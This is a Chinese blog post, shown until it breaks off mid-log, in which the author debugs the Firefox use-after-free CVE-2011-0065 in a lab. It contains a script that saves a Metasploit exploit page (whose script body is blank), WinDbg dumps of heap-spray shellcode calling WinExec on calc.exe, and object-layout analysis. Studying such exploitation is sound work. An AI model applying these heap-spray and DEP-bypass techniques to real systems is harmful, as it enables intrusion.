<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>漏洞调试-释放重引用UAF-cve-2011-0065 | Lyon&#39;s blog</title>
  <meta name="author" content="Lyon">
  
  <meta name="description" content="Walk steps step by step">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="漏洞调试-释放重引用UAF-cve-2011-0065"/>
  <meta property="og:site_name" content="Lyon&#39;s blog"/>

  
    <meta property="og:image" content="undefined"/>
  

  #<link href="/favicon.ico" rel="icon">
  <link rel="icon" type="image/x-icon" href="/favicon.ico">
  <link rel="alternate" href="/atom.xml" title="Lyon&#39;s blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <script src="/js/jquery.min.js"></script>
  <script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?1d807422614f63c8de98cdc3b546860c";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
  <script>
    (function(){
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        }
        else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>
    
  <script data-ad-client="ca-pub-6317609007693835" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-66542057-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-66542057-1');
</script>

</head>


<body>
  <!--[if lte IE 8]> <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'> <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode"><img src="http://storage.ie6countdown.com/assets/100/images/banners/warning_bar_0027_Simplified Chinese.jpg" border="0" height="42" width="820" alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today." style='margin-left:auto;margin-right:auto;display: block;'/></a></div> <![endif]-->
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">Lyon&#39;s blog</a></h1>
  <h2><a href="/">I hear and I forget.I see and I remember.I do and I understand.</a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">首页</a></li>
    
      <li><a href="/archives">归档</a></li>
    
      <li><a href="/about">关于</a></li>
    
	<li> <a href="/atom.xml">RSS</a> </li>
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div></header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <time datetime="2016-07-27T10:57:32.000Z"><a href="/2016/07/27/Debug/debug-vulner-UAF-2011-0065/">2016-07-27</a></time>
      
      
  
    <h1 class="title">漏洞调试-释放重引用UAF-cve-2011-0065</h1>
  

    </header>
	
<!-- Table of Contents -->

  <div id="toc" class="toc-article">
  <strong class="toc-title">文章目录</strong>
  <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#尝试通过exp调试找到漏洞相关函数失败"><span class="toc-number">1.</span> <span class="toc-text">尝试通过exp调试找到漏洞相关函数失败</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#正向调试及漏洞利用简单分析，直接按书上步骤调试"><span class="toc-number">2.</span> <span class="toc-text">正向调试及漏洞利用简单分析，直接按书上步骤调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞函数"><span class="toc-number">3.</span> <span class="toc-text">漏洞函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#更新附录"><span class="toc-number"></span> <span class="toc-text">更新附录</span></a>
  </div>


	
    <div class="entry">
      
        <p>##实验环境<br>操作系统：Windows xp、<br>辅助环境: MetaSploit、Windbg</p>
<p>##准备<br>继续漏洞分析学习，上次分析了0158之后就买了泉哥的漏洞战争，很详细很nice，不用到处去找了就跟着书上流程走就可以了。</p>
<p>###样本生成<br>虽然书的配套资料有样本，但是还是按照之前的流程用MetaSploit生成了漏洞利用样本，然后用python写了个小脚本把样本存下来了（主要是ruby写的利用代码，不怎么看得懂用浏览器访问也不好存）。python脚本和漏洞样本如下<br><a id="more"></a><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import sys</span><br><span class="line">import urllib,urllib2</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding('utf-8')</span><br><span class="line">url = 'http://192.168.168.112:8080/ZWmm2Ia'</span><br><span class="line">headers = &#123; 'Host':'192.168.17.112:8080',</span><br><span class="line">'Connection':'keep-alive',</span><br><span class="line">'Cache-Control':'max-age=0',</span><br><span class="line">'Accept': 'text/html, */*; q=0.01',</span><br><span class="line">'X-Requested-With': 'XMLHttpRequest',</span><br><span class="line">'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16',</span><br><span class="line">'DNT':'1',</span><br><span class="line">'Accept-Encoding': 'gzip,deflate',</span><br><span class="line">'Accept-Language': 'zh-CN,zh;q=0.8,ja;q=0.6'</span><br><span class="line">&#125;</span><br><span class="line">data = None</span><br><span class="line">req = urllib2.Request(url, data, headers)</span><br><span class="line">response = urllib2.urlopen(req)</span><br><span class="line">html=response.read()</span><br><span class="line">print html</span><br><span class="line">fh=open('cve_2011_0065_exploit.html','w')</span><br><span class="line">fh.write(html)</span><br><span class="line">fh.close()</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;object id="d"&gt;&lt;object&gt;</span><br><span class="line">  &lt;applet code="LMFDNKvmiUOMb.class" width=0 height=0&gt;&lt;/applet&gt;</span><br><span class="line">  &lt;script type="text/javascript"&gt;</span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </span><br><span class="line"></span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>这里生成的漏洞利用样本是通过Heap Spray方法布局内存，有通过ROP绕过DEP功能。最后效果是弹出计算器。</p>
<p>###调试环境准备</p>
<ul>
<li>为了方便调试可设置Image File Execution Options注册表项，方便windbg打开自动调试(设置html为firefox自动打开，打开漏洞样本时候就自动断下来了)</li>
<li>设置好符号路径后没有按照预想的自动下载xul.dll的符号文件pdb(可能是网络问题)，可以通过symchk程序找到该符号的链接。比如xul是<a href="http://symbols.mozilla.org/firefox/xul.pdb/04477C20855F439CBD58C311613D2AA92/xul.pdb，那在firefox符号的地址就是http://symbols.mozilla.org/firefox/xul.pdb/04477C20855F439CBD58C311613D2AA92/xul.pd_(pdb在服务器上是压缩的，所以下载下来要解压)" target="_blank" rel="external">http://symbols.mozilla.org/firefox/xul.pdb/04477C20855F439CBD58C311613D2AA92/xul.pdb，那在firefox符号的地址就是http://symbols.mozilla.org/firefox/xul.pdb/04477C20855F439CBD58C311613D2AA92/xul.pd_(pdb在服务器上是压缩的，所以下载下来要解压)</a></li>
<li>没有符号调试是很痛苦的，开始就是不知道什么原因xul.dll的符号信息一直下载失败，折腾了好久才下载成功</li>
</ul>
<div align="center"><br><img src="/img/20160727debugenv.png" alt="调试环境设置好是这个样子的" align="center"><br></div>

<p>##调试</p>
<h3 id="尝试通过exp调试找到漏洞相关函数失败">尝试通过exp调试找到漏洞相关函数失败</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; bu kernel32!winexec</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; bl</span><br><span class="line"> <span class="number">0</span> e <span class="number">7</span>c8623ad     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** kernel32!WinExec</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; k</span><br><span class="line">ChildEBP RetAddr  </span><br><span class="line"><span class="number">0</span>c000385 <span class="number">00000000</span> kernel32!WinExec</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dd esp</span><br><span class="line"><span class="number">0</span>c000034  <span class="number">0</span>c000418 <span class="number">0</span>c000437 <span class="number">00000001</span> <span class="number">93</span>d6f997</span><br><span class="line"><span class="number">0</span>c000044  <span class="number">42904f</span>97 <span class="number">274f</span>4341 <span class="number">46f</span>c9f2f <span class="number">99903f</span>98</span><br><span class="line"><span class="number">0</span>c000054  <span class="number">9f</span>969842 <span class="number">37</span>d6f541 <span class="number">9746434</span>a <span class="number">98f</span>54b48</span><br><span class="line"><span class="number">0</span>c000064  f84bf598 <span class="number">964</span>a4a99 <span class="number">49489698</span> d6489341</span><br><span class="line"><span class="number">0</span>c000074  <span class="number">4</span>b4ffc9f <span class="number">9</span>b3797f8 d6fcd637 <span class="number">90484799</span></span><br><span class="line"><span class="number">0</span>c000084  <span class="number">4e4</span>af99f <span class="number">904327f</span>d <span class="number">402f</span>2f98 <span class="number">979</span>b4141</span><br><span class="line"><span class="number">0</span>c000094  <span class="number">91499847</span> <span class="number">92f</span>d914f <span class="number">913f</span>9846 <span class="number">984746f</span>8</span><br><span class="line"><span class="number">0</span>c0000a4  <span class="number">41404</span>bfc f541f596 <span class="number">903f</span>4292 <span class="number">3f</span>2792d6</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; da <span class="number">0</span>c000437</span><br><span class="line"><span class="number">0</span>c000437  <span class="string">"calc.exe"</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; ub <span class="number">0</span>c000418</span><br><span class="line"><span class="number">0</span>c000403 <span class="number">8</span>b12            mov     edx,dword ptr [edx]</span><br><span class="line"><span class="number">0</span>c000405 eb8d            jmp     <span class="number">0</span>c000394</span><br><span class="line"><span class="number">0</span>c000407 <span class="number">5</span>d              pop     ebp</span><br><span class="line"><span class="number">0</span>c000408 <span class="number">6</span>a01            push    <span class="number">1</span></span><br><span class="line"><span class="number">0</span>c00040a <span class="number">8</span>d85b2000000    lea     eax,[ebp+<span class="number">0</span>B2h]</span><br><span class="line"><span class="number">0</span>c000410 <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">0</span>c000411 <span class="number">68318</span>b6f87      push    <span class="number">876F</span>8B31h</span><br><span class="line"><span class="number">0</span>c000416 ffd5            call    ebp        <span class="comment">//这里调用winexec</span></span><br><span class="line"><span class="comment">//在0c00040a指令之前的全部都是滑板指令</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !address <span class="number">0</span>c000416</span><br><span class="line">Usage:                  &lt;unclassified&gt;</span><br><span class="line">Allocation Base:        <span class="number">0</span>c000000</span><br><span class="line">Base Address:           <span class="number">0</span>c000000</span><br><span class="line">End Address:            <span class="number">0</span>c001000</span><br><span class="line">Region Size:            <span class="number">00001000</span></span><br><span class="line">Type:                   <span class="number">00020000</span>	MEM_PRIVATE</span><br><span class="line">State:                  <span class="number">00001000</span>	MEM_COMMIT</span><br><span class="line">Protect:                <span class="number">00000040</span>	PAGE_EXECUTE_READWRITE</span><br></pre></td></tr></table></figure>
<p>直接通过exploit来找uaf漏洞函数感觉不好找，又没什么经验所以还是按照书里步骤来吧</p>
<h3 id="正向调试及漏洞利用简单分析，直接按书上步骤调试">正向调试及漏洞利用简单分析，直接按书上步骤调试</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br></pre></td><td class="code"><pre><span class="line">//直接按照书上的下好断点，起始exploit样本里面有OnChannelRedirect函数但是不知道怎么对应</span><br><span class="line">0:000&gt; bl</span><br><span class="line">0 e 7c8623ad     0001 (0001)  0:**** kernel32!WinExec</span><br><span class="line">1 e 107f4e72     0001 (0001)  0:**** xul!nsObjectLoadingContent::LoadObject+0x105</span><br><span class="line">2 e 104623b0     0001 (0001)  0:**** xul!nsObjectLoadingContent::OnChannelRedirect</span><br><span class="line">0:000&gt; kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0012ebec 10274b06 032873d8 00000000 03878040 xul!nsObjectLoadingContent::OnChannelRedirect (FPO: [4,0,0]) (CONV: stdcall) [e:\builds\moz2_slave\rel-192-w32-bld\build\content\base\src\nsobjectloadingcontent.cpp @ 1017]</span><br><span class="line">0012ec10 1010f422 032873d8 00000003 00000003 xul!NS_InvokeByIndex_P+0x27 (FPO: [Non-Fpo]) (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\xpcom\reflect\xptcall\src\md\win32\xptcinvoke.cpp @ 103]</span><br><span class="line">0012eea8 10118bf3 0012eed8 00000000 00000000 xul!XPCWrappedNative::CallMethod+0x572 (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\xpconnect\src\xpcwrappednative.cpp @ 2722]</span><br><span class="line">0012ef74 00516add 02fb3c00 02e1b700 00000003 xul!XPC_WN_CallMethod+0x173 (FPO: [Uses EBP] [5,44,4]) (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\xpconnect\src\xpcwrappednativejsops.cpp @ 1740]</span><br><span class="line">0012f028 0051b800 02fb3c00 00000003 0381206c js3250!js_Invoke+0x42d (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsinterp.cpp @ 1360]</span><br><span class="line">0012f254 004f7195 02fb3c00 0012f304 033f8800 js3250!js_Interpret+0x29a0 (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsops.cpp @ 2241]</span><br><span class="line">0012f2d8 004e41d1 015f1a40 033f8800 00000000 js3250!js_Execute+0x1a5 (FPO: [Uses EBP] [4,29,2]) (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsinterp.cpp @ 1601]</span><br><span class="line">0012f304 1007f780 02fb3c00 015f1a40 033f0334 js3250!JS_EvaluateUCScriptForPrincipals+0x61 (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsapi.cpp @ 5058]</span><br><span class="line">0012f378 1007f57a 0012f44c 015f1a40 033f0330 xul!nsJSContext::EvaluateString+0x158 (CONV: thiscall) [e:\builds\moz2_slave\rel-192-w32-bld\build\dom\base\nsjsenvironment.cpp @ 1764]</span><br><span class="line">0:000&gt; dd esp</span><br><span class="line">0012ebf0  10274b06 032873d8 00000000 03878040</span><br><span class="line">0012ec00  00000000 008ec880 00000000 0012eea8</span><br><span class="line">0012ec10  0012eea8 1010f422 032873d8 00000003</span><br><span class="line">0012ec20  00000003 0012ecc0 00000000 02e1b7e0</span><br><span class="line">0012ec30  00521c20 0012ec44 0606cc0c 00000000</span><br><span class="line">0012ec40  03fb3c00 00000000 032e6603 0381efb4</span><br><span class="line">0012ec50  008ba070 019a7318 00000003 00000002</span><br><span class="line">0012ec60  00000003 0012ecc0 00000001 03812074</span><br><span class="line">//这里注意windb自动识别的参数有问题（Locals窗口显示的变量和实际不对应），因为是c++函数调用所以OnChannelRedirect函数在汇编层应该是4个参数，第一个参数应该是this指针</span><br><span class="line">//所以参数对应为this 032873d8,*aOldChannel=0，*aNewChannel=03878040，aFlags=00000000 </span><br><span class="line">0:000&gt; dt nsObjectLoadingContent 032873d8 </span><br><span class="line">xul!nsObjectLoadingContent</span><br><span class="line">   +0x000 __VFN_table : 0x109e11cc </span><br><span class="line">   +0x004 mCurrentRequest  : nsCOMPtr&lt;imgIRequest&gt;</span><br><span class="line">   +0x008 mPendingRequest  : nsCOMPtr&lt;imgIRequest&gt;</span><br><span class="line">   +0x00c mCurrentURI      : nsCOMPtr&lt;nsIURI&gt;</span><br><span class="line">   +0x010 mObserverList    : nsImageLoadingContent::ImageObserver</span><br><span class="line">   +0x018 mForcedImageState : 0n1</span><br><span class="line">   +0x01c mImageBlockingStatus : 0n0  //mChannel起始是这里这个(开始是0)，不是+0x050 mChannel 不知道为什么.... </span><br><span class="line">   +0x01e mLoadingEnabled  : 0y0</span><br><span class="line">   +0x01e mStartingLoad    : 0y0</span><br><span class="line">   +0x01e mIsImageStateForced : 0y0</span><br><span class="line">   +0x01e mLoading         : 0y0</span><br><span class="line">   +0x01e mBroken          : 0y0</span><br><span class="line">   +0x01e mUserDisabled    : 0y0</span><br><span class="line">   +0x01e mSuppressed      : 0y0</span><br><span class="line">   +0x020 __VFN_table : (null) </span><br><span class="line">   +0x024 __VFN_table : (null) </span><br><span class="line">   +0x028 __VFN_table : 0x02d00000 </span><br><span class="line">   +0x02c __VFN_table : 0x00000004 </span><br><span class="line">   +0x030 __VFN_table : 0x109e11e0 </span><br><span class="line">   +0x034 __VFN_table : 0x109e1348 </span><br><span class="line">   +0x038 mFinalListener   : nsCOMPtr&lt;nsIStreamListener&gt;</span><br><span class="line">   +0x03c mFrameLoader     : nsRefPtr&lt;nsFrameLoader&gt;</span><br><span class="line">   +0x040 mPendingInstantiateEvent : (null) </span><br><span class="line">   +0x044 mContentType     : nsCString</span><br><span class="line">   +0x050 mChannel         : 0x033b1130 nsIChannel</span><br><span class="line">   +0x054 mURI             : nsCOMPtr&lt;nsIURI&gt;</span><br><span class="line">   +0x058 mClassifier      : nsCOMPtr&lt;nsIChannelClassifier&gt;</span><br><span class="line">   +0x05c mType            : 0y00000000000001015 (No matching name)</span><br><span class="line"></span><br><span class="line">   +0x05c mInstantiating   : 0y0</span><br><span class="line">   +0x05c mUserDisabled    : 0y0</span><br><span class="line">   +0x05c mSuppressed      : 0y0</span><br><span class="line">   +0x060 mFallbackReason  : 0x386e220 (No matching name)</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=00000000 ebx=0012eed8 ecx=00000000 edx=109e11cc esi=032873d8 edi=00000002</span><br><span class="line">eip=104623c8 esp=0012ebec ebp=0012ec10 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">xul!nsObjectLoadingContent::OnChannelRedirect+0x18:</span><br><span class="line">104623c8 85c0            test    eax,eax</span><br><span class="line">//对新的mChannel下硬件写入断点</span><br><span class="line">0:000&gt; ba w 4 03878040</span><br><span class="line">0:000&gt; ? esi+1ch</span><br><span class="line">Evaluate expression: 52982772 = 032873f4</span><br><span class="line">0:000&gt; bl</span><br><span class="line"> 0 e 7c8623ad     0001 (0001)  0:**** kernel32!WinExec</span><br><span class="line"> 1 e 107f4e72     0001 (0001)  0:**** xul!nsObjectLoadingContent::LoadObject+0x105</span><br><span class="line"> 2 e 104623b0     0001 (0001)  0:**** xul!nsObjectLoadingContent::OnChannelRedirect</span><br><span class="line"> 4 e 03878040 w 4 0001 (0001)  0:**** </span><br><span class="line"></span><br><span class="line">// if (mClassifier) &#123;</span><br><span class="line">//    mClassifier-&gt;OnRedirect(aOldChannel, aNewChannel);</span><br><span class="line">//  &#125;</span><br><span class="line">//  mChannel = aNewChannel;</span><br><span class="line">//  return NS_OK;</span><br><span class="line">0:000&gt; dt nsObjectLoadingContent 032873d8 </span><br><span class="line">xul!nsObjectLoadingContent</span><br><span class="line">   +0x000 __VFN_table : 0x109e11cc </span><br><span class="line">   +0x004 mCurrentRequest  : nsCOMPtr&lt;imgIRequest&gt;</span><br><span class="line">   +0x008 mPendingRequest  : nsCOMPtr&lt;imgIRequest&gt;</span><br><span class="line">   +0x00c mCurrentURI      : nsCOMPtr&lt;nsIURI&gt;</span><br><span class="line">   +0x010 mObserverList    : nsImageLoadingContent::ImageObserver</span><br><span class="line">   +0x018 mForcedImageState : 0n1</span><br><span class="line">   +0x01c mImageBlockingStatus : 0n-32704 //这里已经变成aNewChannel的值了</span><br><span class="line">   +0x01e mLoadingEnabled  : 0y1</span><br><span class="line">   +0x01e mStartingLoad    : 0y1</span><br><span class="line">   +0x01e mIsImageStateForced : 0y1</span><br><span class="line">   +0x01e mLoading         : 0y0</span><br><span class="line">   